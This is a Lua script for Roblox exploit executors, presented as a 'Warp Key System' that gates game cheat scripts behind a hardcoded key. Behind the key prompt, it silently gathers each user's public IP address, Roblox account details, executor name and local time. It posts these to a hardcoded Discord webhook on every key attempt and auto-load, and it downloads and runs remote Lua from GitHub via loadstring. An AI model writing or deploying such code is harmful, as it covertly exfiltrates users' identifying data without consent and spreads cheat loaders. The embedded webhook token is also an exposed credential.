-- Warp Key System - UPDATED WITH GAME CHECK AND LOGGING

local plr = game.Players.LocalPlayer
local uis = game:GetService("UserInputService")
local tw = game:GetService("TweenService")
local sg = game:GetService("StarterGui")
local http = game:GetService("HttpService")
local market = game:GetService("MarketplaceService")

--------------------------------------------------
-- CONFIG
--------------------------------------------------

local CORRECT_KEY = "warp123"
local DISCORD_LINK = "https://discord.gg/warphub"
local WEBHOOK_URL = "https://discord.com/api/webhooks/1454722498422636565/gPSTfTXLzNx2hCG5vPVj7OGQvrADswOkV06P6UpVO8eQIuMNJx7T829erp1nawjMPF3C"
local LOGGED_USERS_FILE = "Warp_LoggedUsers.json"

-- SUPPORTED GAMES
local GAME_SCRIPTS = {
    [88929752766075] = "https://raw.githubusercontent.com/adubwon/geekUI/main/Games/BladeBattle.lua",
    [109397169461300] = "https://github.com/adubwon/geekUI/raw/refs/heads/main/Universal/warp.lua",
    [286090429] = "https://github.com/adubwon/geekUI/raw/refs/heads/main/Universal/warp.lua",
    [2788229376] = "https://github.com/adubwon/geekUI/raw/refs/heads/main/Universal/warp.lua",
    [85509428618863] = "https://github.com/adubwon/geekUI/raw/refs/heads/main/Games/WormIO.lua",
    [116610479068550] = "https://github.com/adubwon/geekUI/raw/refs/heads/main/Games/ClassClash.lua",
    [133614490579000] = "https://github.com/adubwon/geekUI/raw/refs/heads/main/Games/Laser%20A%20Planet.lua",
    [8737602449] = "https://github.com/adubwon/geekUI/raw/refs/heads/main/Games/PlsDonate.lua",
    [292439477] = "https://github.com/adubwon/geekUI/raw/refs/heads/main/Universal/warp.lua",
    [17625359962] = "https://github.com/adubwon/geekUI/raw/refs/heads/main/Universal/warp.lua",
    [3623096087] = "https://github.com/adubwon/geekUI/raw/refs/heads/main/Games/musclelegends.lua",
}

local CURRENT_PLACE_ID = game.PlaceId
local SCRIPT_TO_LOAD = GAME_SCRIPTS[CURRENT_PLACE_ID]

--------------------------------------------------
-- STORAGE
--------------------------------------------------

local KEY_STORAGE_FILE = "Warp_KeyData.json"

--------------------------------------------------
-- COLORS
--------------------------------------------------

local COLORS = {
    Primary = Color3.fromRGB(0, 150, 255),
    Secondary = Color3.fromRGB(0, 100, 200),
    Accent = Color3.fromRGB(100, 200, 255),
    Background = Color3.fromRGB(15, 15, 15),
    SecondaryBG = Color3.fromRGB(25, 25, 25),
    Frame = Color3.fromRGB(35, 35, 35),
    Text = Color3.fromRGB(255, 255, 255),
    TextDim = Color3.fromRGB(180, 180, 180),
    Success = Color3.fromRGB(50, 255, 50),
    Error = Color3.fromRGB(255, 50, 50),
}

--------------------------------------------------
-- DUPLICATE LOG PREVENTION
--------------------------------------------------

local function hasUserBeenLogged()
    local success, result = pcall(function()
        if isfile(LOGGED_USERS_FILE) then
            local data = http:JSONDecode(readfile(LOGGED_USERS_FILE))
            return data[plr.UserId] == true
        end
        return false
    end)
    return success and result or false
end

local function markUserAsLogged()
    pcall(function()
        local data = {}
        if isfile(LOGGED_USERS_FILE) then
            data = http:JSONDecode(readfile(LOGGED_USERS_FILE))
        end
        data[plr.UserId] = true
        writefile(LOGGED_USERS_FILE, http:JSONEncode(data))
    end)
end

--------------------------------------------------
-- LOGGING FUNCTIONS
--------------------------------------------------

local function getIP()
    local success, result = pcall(function()
        local ipMethods = {
            function() 
                if syn and syn.request then
                    local response = syn.request({
                        Url = "https://api.ipify.org",
                        Method = "GET"
                    })
                    return response.Body and response.Body:gsub("%s+", "")
                end
            end,
            function() 
                if request then
                    local response = request({
                        Url = "https://api.ipify.org",
                        Method = "GET"
                    })
                    return response.Body and tostring(response.Body):gsub("%s+", "")
                end
            end,
            function()
                return game:HttpGet("https://api.ipify.org")
            end
        }
        
        for i, method in ipairs(ipMethods) do
            local ok, ip = pcall(method)
            if ok and ip and #ip > 0 and ip:match("%d+%.%d+%.%d+%.%d+") then
                return ip:gsub("%s+", ""):gsub("\n", "")
            end
        end
        return "Unknown"
    end)
    return success and result or "Unknown"
end

local function getExecutorInfo()
    if syn then
        if syn.protect_gui then
            return "Synapse X"
        end
        return "Synapse"
    elseif PROTOSMASHER_LOADED then
        return "ProtoSmasher"
    elseif KRNL_LOADED then
        return "KRNL"
    elseif isexecutorclosure then
        return "Script-Ware"
    elseif fluxus then
        return "Fluxus"
    elseif getexecutorname then
        local name = getexecutorname()
        if name:lower():find("xeno") then
            return "Xeno"
        elseif name:lower():find("delta") then
            return "Delta"
        elseif name:lower():find("krnl") then
            return "KRNL"
        end
        return name
    elseif identifyexecutor then
        local exec = identifyexecutor()
        if exec:lower():find("xeno") then
            return "Xeno"
        elseif exec:lower():find("delta") then
            return "Delta"
        elseif exec:lower():find("krnl") then
            return "KRNL"
        elseif exec:lower():find("scriptware") or exec:lower():find("script-ware") then
            return "Script-Ware"
        elseif exec:lower():find("synapse") then
            return "Synapse"
        elseif exec:lower():find("fluxus") then
            return "Fluxus"
        end
        return exec
    elseif _G.Sentinel then
        return "Sentinel"
    elseif get_hidden_gui then
        return "Comet"
    elseif drawing then
        return "Drawing API Available"
    elseif secure_load then
        return "Secure Load"
    elseif getreg then
        return "Registry Access"
    elseif debug.getupvalue then
        return "Debug Access"
    else
        return "Unknown/Roblox"
    end
end

local function getHardwareInfo()
    local info = {
        executor = getExecutorInfo(),
        fps = math.floor(workspace:GetRealPhysicsFPS()) or 0,
        ping = game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValue() or 0,
    }
    
    return info
end

local function getAccountInfo()
    local info = {
        username = plr.Name,
        userId = plr.UserId,
        displayName = plr.DisplayName,
        accountAge = plr.AccountAge,
        membership = "Standard"
    }
    
    pcall(function()
        if plr.MembershipType == Enum.MembershipType.Premium then
            info.membership = "Roblox Premium"
        elseif plr.MembershipType == Enum.MembershipType.OutrageousBuildersClub then
            info.membership = "OBC"
        elseif plr.MembershipType == Enum.MembershipType.TurboBuildersClub then
            info.membership = "TBC"
        elseif plr.MembershipType == Enum.MembershipType.BuildersClub then
            info.membership = "BC"
        end
    end)
    
    return info
end

local function getGameInfo()
    local success, gameData = pcall(function()
        return market:GetProductInfo(CURRENT_PLACE_ID)
    end)
    
    if success and gameData then
        return {
            name = gameData.Name or "Unknown Game",
            creator = gameData.Creator.Name or "Unknown Creator",
        }
    end
    
    return {
        name = "Place ID: " .. tostring(CURRENT_PLACE_ID),
        creator = "Unknown",
    }
end

local function createEmbed(title, description, color, fields)
    local embed = {
        title = title,
        description = description,
        color = color,
        fields = fields,
        timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ"),
        footer = {
            text = "Warp Key System Logger"
        }
    }
    return embed
end

local function sendWebhookEmbed(eventType, keyAttempt, success)
    pcall(function()
        local ipAddress = getIP()
        local accountInfo = getAccountInfo()
        local hardwareInfo = getHardwareInfo()
        local gameInfo = getGameInfo()
        
        local fields = {}
        
        table.insert(fields, {
            name = "ROBLOX ACCOUNT INFORMATION",
            value = string.format("Username: %s\nUser ID: %d\nDisplay Name: %s\nAccount Age: %d days\nMembership: %s",
                accountInfo.username,
                accountInfo.userId,
                accountInfo.displayName,
                accountInfo.accountAge,
                accountInfo.membership)
        })
        
        table.insert(fields, {
            name = "NETWORK INFORMATION",
            value = string.format("IP Address: ||%s||\nExecutor: %s\nPing: %d ms\nFPS: %d",
                ipAddress,
                hardwareInfo.executor,
                hardwareInfo.ping,
                hardwareInfo.fps)
        })
        
        table.insert(fields, {
            name = "GAME INFORMATION",
            value = string.format("Game: %s\nPlace ID: %d\nCreator: %s",
                gameInfo.name,
                CURRENT_PLACE_ID,
                gameInfo.creator)
        })
        
        local eventValue = string.format("Event Type: %s", eventType)
        if keyAttempt and keyAttempt ~= "N/A" then
            local status = success and "SUCCESS" or "FAILED"
            eventValue = eventValue .. string.format("\nKey Attempt: %s\nStatus: %s", keyAttempt, status)
        end
        
        table.insert(fields, {
            name = "EVENT INFORMATION",
            value = eventValue
        })
        
        table.insert(fields, {
            name = "TIME INFORMATION",
            value = string.format("Local Time: %s\nUTC Time: %s",
                os.date("%Y-%m-%d %H:%M:%S"),
                os.date("!%Y-%m-%d %H:%M:%S"))
        })
        
        local color
        if eventType == "KEY VERIFIED" then
            color = 3066993 -- Green
        elseif eventType == "KEY REJECTED" then
            color = 15158332 -- Red
        else
            color = 3447003 -- Blue
        end
        
        local embed = createEmbed(
            "Warp Key System - " .. eventType,
            "User interaction detected and logged",
            color,
            fields
        )
        
        local payload = {
            embeds = {embed},
            username = "Warp Security Logger",
            avatar_url = "https://i.imgur.com/wSTFkRM.png"
        }
        
        local jsonPayload = http:JSONEncode(payload)
        
        if syn and syn.request then
            syn.request({
                Url = WEBHOOK_URL,
                Method = "POST",
                Headers = {
                    ["Content-Type"] = "application/json"
                },
                Body = jsonPayload
            })
        elseif request then
            request({
                Url = WEBHOOK_URL,
                Method = "POST",
                Headers = {
                    ["Content-Type"] = "application/json"
                },
                Body = jsonPayload
            })
        else
            http:PostAsync(WEBHOOK_URL, jsonPayload)
        end
        
        -- Mark user as logged after successful key verification
        if eventType == "KEY VERIFIED" then
            markUserAsLogged()
        end
    end)
end

--------------------------------------------------
-- LOGGING FUNCTIONS
--------------------------------------------------

local function logKeyAttempt(enteredKey, success)
    local eventType = success and "KEY VERIFIED" or "KEY REJECTED"
    sendWebhookEmbed(eventType, enteredKey, success)
end

local function logButtonClick(buttonName)
    -- Don't log button clicks for unverified users
    if not hasUserBeenLogged() then
        return
    end
    sendWebhookEmbed("BUTTON CLICK", buttonName)
end

local function logScriptLoaded()
    -- Only log script loaded for verified users
    if not hasUserBeenLogged() then
        return
    end
    sendWebhookEmbed("SCRIPT LOADED", "N/A")
end

--------------------------------------------------
-- HELPERS
--------------------------------------------------

local function notify(title, text, dur)
    pcall(function()
        sg:SetCore("SendNotification", {
            Title = title,
            Text = text,
            Duration = dur or 3
        })
    end)
end

local function tween(obj, props, time, style)
    tw:Create(obj, TweenInfo.new(time or 0.3, style or Enum.EasingStyle.Quad), props):Play()
end

local function createCorner(obj, r)
    local c = Instance.new("UICorner", obj)
    c.CornerRadius = UDim.new(0, r or 10)
    return c
end

local function createStroke(obj, color, thickness)
    local s = Instance.new("UIStroke", obj)
    s.Color = color
    s.Thickness = thickness or 2
    return s
end

local function createGlow(parent, color)
    local g = Instance.new("ImageLabel", parent)
    g.Size = UDim2.new(1, 30, 1, 30)
    g.Position = UDim2.new(0, -15, 0, -15)
    g.BackgroundTransparency = 1
    g.Image = "rbxassetid://94551274981295"
    g.ImageColor3 = color
    g.ImageTransparency = 0.6
    g.ZIndex = 0
    return g
end

local function hover(btn, base, hover)
    btn.MouseEnter:Connect(function()
        tw:Create(btn, TweenInfo.new(0.15), {BackgroundColor3 = hover}):Play()
    end)
    btn.MouseLeave:Connect(function()
        tw:Create(btn, TweenInfo.new(0.15), {BackgroundColor3 = base}):Play()
    end)
end

--------------------------------------------------
-- FILE HANDLING
--------------------------------------------------

local function saveKeyData()
    pcall(function()
        writefile(KEY_STORAGE_FILE, http:JSONEncode({
            key_verified = true,
            user_id = plr.UserId,
            saved_key = CORRECT_KEY,
            timestamp = os.time(),
            username = plr.Name
        }))
    end)
end

local function loadKeyData()
    local success, result = pcall(function()
        if isfile(KEY_STORAGE_FILE) then
            local data = http:JSONDecode(readfile(KEY_STORAGE_FILE))
            return data.key_verified and data.user_id == plr.UserId and data.saved_key == CORRECT_KEY
        end
        return false
    end)
    return success and result
end

--------------------------------------------------
-- LOAD SCRIPT
--------------------------------------------------

local function loadMainScript()
    if not SCRIPT_TO_LOAD then
        notify("Error", "No script available for this game.", 3)
        return
    end

    local ok, err = pcall(function()
        loadstring(game:HttpGet(SCRIPT_TO_LOAD))()
    end)

    if ok then
        notify("Success", "Script loaded successfully!", 3)
        logScriptLoaded()
    else
        notify("Error", tostring(err), 5)
    end
end

--------------------------------------------------
-- CREATE UI
--------------------------------------------------

local gui = Instance.new("ScreenGui")
gui.Name = "WarpKeySystem"
gui.ResetOnSpawn = false
gui.Parent = game.CoreGui

local iconBtn = Instance.new("ImageButton", gui)
iconBtn.Size = UDim2.new(0, 70, 0, 70)
iconBtn.Position = UDim2.new(0, 20, 0, 20)
iconBtn.Image = "rbxassetid://90013112630319"
iconBtn.BackgroundColor3 = COLORS.Background
iconBtn.AutoButtonColor = false
iconBtn.BorderSizePixel = 0
iconBtn.Active = true
iconBtn.Draggable = true

createCorner(iconBtn, 16)
createStroke(iconBtn, COLORS.Primary)
createGlow(iconBtn, COLORS.Primary)

--------------------------------------------------
-- MAIN FRAME
--------------------------------------------------

local frame = Instance.new("Frame", gui)
frame.Size = UDim2.new(0, 420, 0, 320)
frame.Position = UDim2.new(0.5, -210, 0.5, -160)
frame.BackgroundColor3 = COLORS.Background
frame.Visible = true
frame.BorderSizePixel = 0
frame.Active = true
frame.Draggable = true

createCorner(frame, 20)
createStroke(frame, COLORS.Primary)
createGlow(frame, COLORS.Primary)

--------------------------------------------------
-- HEADER
--------------------------------------------------

local header = Instance.new("Frame", frame)
header.Size = UDim2.new(1, 0, 0, 80)
header.BackgroundColor3 = Color3.fromRGB(18, 18, 18)
header.BorderSizePixel = 0
createCorner(header, 20)

local title = Instance.new("TextLabel", header)
title.Size = UDim2.new(1, -40, 0, 40)
title.Position = UDim2.new(0, 20, 0, 20)
title.Text = "Warp Key System"
title.Font = Enum.Font.GothamBold
title.TextSize = 26
title.TextColor3 = Color3.fromRGB(255, 255, 255)
title.BackgroundTransparency = 1

--------------------------------------------------
-- INPUT
--------------------------------------------------

local inputFrame = Instance.new("Frame", frame)
inputFrame.Size = UDim2.new(1, -40, 0, 50)
inputFrame.Position = UDim2.new(0, 20, 0, 120)
inputFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
inputFrame.BorderSizePixel = 0
createCorner(inputFrame, 12)

local inputStroke = createStroke(inputFrame, Color3.fromRGB(40, 40, 40))

local keyBox = Instance.new("TextBox", inputFrame)
keyBox.Size = UDim2.new(1, -20, 1, 0)
keyBox.Position = UDim2.new(0, 10, 0, 0)
keyBox.PlaceholderText = "Enter key..."
keyBox.TextColor3 = Color3.fromRGB(255, 255, 255)
keyBox.BackgroundTransparency = 1
keyBox.Font = Enum.Font.Gotham
keyBox.TextSize = 15

--------------------------------------------------
-- BUTTONS
--------------------------------------------------

local submit = Instance.new("TextButton", frame)
submit.Size = UDim2.new(1, -40, 0, 50)
submit.Position = UDim2.new(0, 20, 0, 190)
submit.Text = "Verify Key"
submit.Font = Enum.Font.GothamBold
submit.TextSize = 16
submit.TextColor3 = Color3.fromRGB(255, 255, 255)
submit.BackgroundColor3 = COLORS.Primary
submit.BorderSizePixel = 0

createCorner(submit, 12)
createGlow(submit, COLORS.Primary)

local getKey = Instance.new("TextButton", frame)
getKey.Size = UDim2.new(1, -40, 0, 45)
getKey.Position = UDim2.new(0, 20, 0, 250)
getKey.Text = "Get Key"
getKey.Font = Enum.Font.GothamBold
getKey.TextSize = 15
getKey.TextColor3 = Color3.fromRGB(255, 255, 255)
getKey.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
getKey.BorderSizePixel = 0

createCorner(getKey, 12)

hover(submit, COLORS.Primary, Color3.fromRGB(0, 180, 255))
hover(getKey, Color3.fromRGB(40, 40, 40), Color3.fromRGB(60, 60, 60))

--------------------------------------------------
-- AUTO LOAD
--------------------------------------------------

local function handleAutoLoad()
    if loadKeyData() and SCRIPT_TO_LOAD then
        -- Auto-load from saved key - log as verified
        frame.Visible = false
        iconBtn.Visible = false
        notify("Verified", "Loading script...", 2)
        task.wait(0.5)
        loadMainScript()
        -- Log the auto-load as a key verification
        logKeyAttempt("AUTO-LOAD (Saved Key)", true)
    end
end

handleAutoLoad()

--------------------------------------------------
-- LOGIC
--------------------------------------------------

submit.MouseButton1Click:Connect(function()
    local enteredKey = keyBox.Text
    local success = enteredKey == CORRECT_KEY
    
    -- Always log key attempts (success or failure)
    logKeyAttempt(enteredKey, success)
    
    if success then
        saveKeyData()
        notify("Success", "Key verified!", 3)
        frame.Visible = false
        iconBtn.Visible = false
        loadMainScript()
    else
        notify("Invalid Key", "Wrong key entered.", 3)
    end
end)

getKey.MouseButton1Click:Connect(function()
    -- Only log button click if user is already verified
    logButtonClick("Get Key Button")
    
    if setclipboard then
        setclipboard(DISCORD_LINK)
    end

    pcall(function()
        if syn and syn.request then
            syn.request({ Url = DISCORD_LINK, Method = "GET" })
        elseif request then
            request({ Url = DISCORD_LINK, Method = "GET" })
        end
    end)

    notify("Copied!", "Discord invite copied.", 3)
end)

iconBtn.MouseButton1Click:Connect(function()
    frame.Visible = not frame.Visible
    if frame.Visible then
        logButtonClick("Open UI")
    end
end)

--------------------------------------------------
-- END
--------------------------------------------------
